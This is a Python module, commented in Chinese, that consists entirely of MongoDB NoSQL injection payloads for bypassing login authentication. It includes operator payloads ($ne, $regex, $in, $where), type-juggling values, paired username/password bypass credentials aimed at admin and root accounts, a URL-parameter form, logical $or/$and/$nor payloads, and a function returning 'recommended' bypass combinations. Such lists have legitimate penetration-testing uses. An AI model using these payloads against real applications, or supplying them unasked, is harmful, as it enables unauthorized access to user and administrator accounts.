"""
MongoDB 認證繞過注入載荷
包含各種針對登入/認證功能的MongoDB注入載荷
"""

# 單一參數認證繞過 (用戶名或密碼字段)
SINGLE_PARAM_PAYLOADS = [
    # 基本繞過
    {"name": "永真條件", "value": {"$ne": ""}, "description": "使任何條件都為真"},
    {"name": "空值匹配", "value": {"$exists": False}, "description": "匹配字段不存在的文檔"},
    {"name": "正則表達式匹配所有", "value": {"$regex": ".*"}, "description": "使用正則表達式匹配任意字符串"},
    {"name": "正則表達式不區分大小寫", "value": {"$regex": ".*", "$options": "i"}, "description": "不區分大小寫的正則表達式匹配"},
    {"name": "包含操作", "value": {"$in": ["", "admin", "administrator", "user", "root"]}, "description": "匹配常見用戶名"},
    {"name": "或條件", "value": {"$or": [{"username": ""}, {"username": "admin"}]}, "description": "使用$or操作符匹配多個可能值"},
    
    # JavaScript注入
    {"name": "JavaScript空條件", "value": {"$where": "return true"}, "description": "使用JavaScript返回永真值"},
    {"name": "JavaScript字段長度檢查", "value": {"$where": "this.password.length > 0"}, "description": "檢查密碼長度"},
    
    # 數據類型繞過
    {"name": "整數替換", "value": 1, "description": "嘗試使用整數類型"},
    {"name": "布爾值替換", "value": True, "description": "嘗試使用布爾類型"},
    {"name": "空數組", "value": [], "description": "嘗試使用空數組"},
    {"name": "空對象", "value": {}, "description": "嘗試使用空對象"},
]

# 雙參數認證繞過 (同時針對用戶名和密碼字段)
AUTH_BYPASS_PAYLOADS = [
    # 基本組合
    {
        "name": "基本認證繞過",
        "credentials": {"username": {"$ne": ""}, "password": {"$ne": ""}},
        "description": "最常見的認證繞過載荷"
    },
    {
        "name": "管理員用戶繞過",
        "credentials": {"username": "admin", "password": {"$ne": ""}},
        "description": "針對admin賬戶的密碼繞過"
    },
    {
        "name": "管理員模糊匹配",
        "credentials": {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
        "description": "匹配以admin開頭的用戶名"
    },
    {
        "name": "常見用戶繞過",
        "credentials": {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}},
        "description": "匹配常見管理用戶名"
    },
    
    # 高級組合
    {
        "name": "參數傳播",
        "credentials": {"username": {"$ne": ""}, "password": {"$ne": ""}},
        "url_params": "username[$ne]=&password[$ne]=",
        "description": "URL參數形式的載荷"
    },
    {
        "name": "空值組合",
        "credentials": {"username": {"$exists": True}, "password": {"$exists": True}},
        "description": "只檢查字段存在性"
    },
    {
        "name": "正則與永真",
        "credentials": {"username": {"$regex": ".*"}, "password": {"$ne": ""}},
        "description": "用戶名使用正則，密碼使用$ne"
    },
]

# 集合參數繞過 (單一JSON對象包含邏輯操作符)
LOGICAL_AUTH_PAYLOADS = [
    {
        "name": "OR操作符組合",
        "payload": {"$or": [{"username": "admin", "password": {"$regex": ".*"}}, {"username": {"$ne": ""}}]},
        "description": "使用$or操作符組合多種可能情況"
    },
    {
        "name": "AND操作符組合",
        "payload": {"$and": [{"username": {"$ne": "invalid"}}, {"password": {"$ne": "invalid"}}]},
        "description": "使用$and操作符組合條件"
    },
    {
        "name": "NOR操作符否定",
        "payload": {"$nor": [{"username": {"$eq": "invalid"}}, {"password": {"$eq": "invalid"}}]},
        "description": "使用$nor操作符否定無效條件"
    },
]

# 獲取推薦的認證繞過載荷組合
def get_recommended_auth_payloads():
    """獲取推薦的認證繞過載荷組合"""
    return [
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": "admin", "password": {"$ne": ""}},
        {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}},
        {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
        {"$or": [{"username": "admin"}, {"username": {"$regex": "admin"}}], "password": {"$ne": ""}}
    ] 